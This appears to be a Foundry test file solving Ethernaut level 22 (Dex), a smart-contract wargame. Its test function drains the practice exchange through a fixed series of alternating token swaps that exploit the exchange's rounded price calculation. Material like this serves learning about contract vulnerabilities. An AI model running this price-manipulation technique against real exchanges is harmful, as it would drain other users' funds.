// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/22-Dex/Dex.sol";
import "../src/levels/22-Dex/DexFactory.sol";

contract DexTest is Test {
    Ethernaut public ethernaut;
    DexFactory public dexFactory;
    Dex public dex;
    address internal levelAddr;

    address attacker = address(0x1);

    function setUp() public {
        vm.deal(attacker, 10_000 ether);

        ethernaut = new Ethernaut();
        dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);

        vm.startPrank(attacker);
        levelAddr = ethernaut.createLevelInstance(dexFactory);
        dex = Dex(payable(levelAddr));
    }

    function testAttack() public {
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.approve(address(dex), 100);
        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);

        bool success = ethernaut.submitLevelInstance(payable(levelAddr));
        assertTrue(success, "Solution is not solving the level");
    }
}
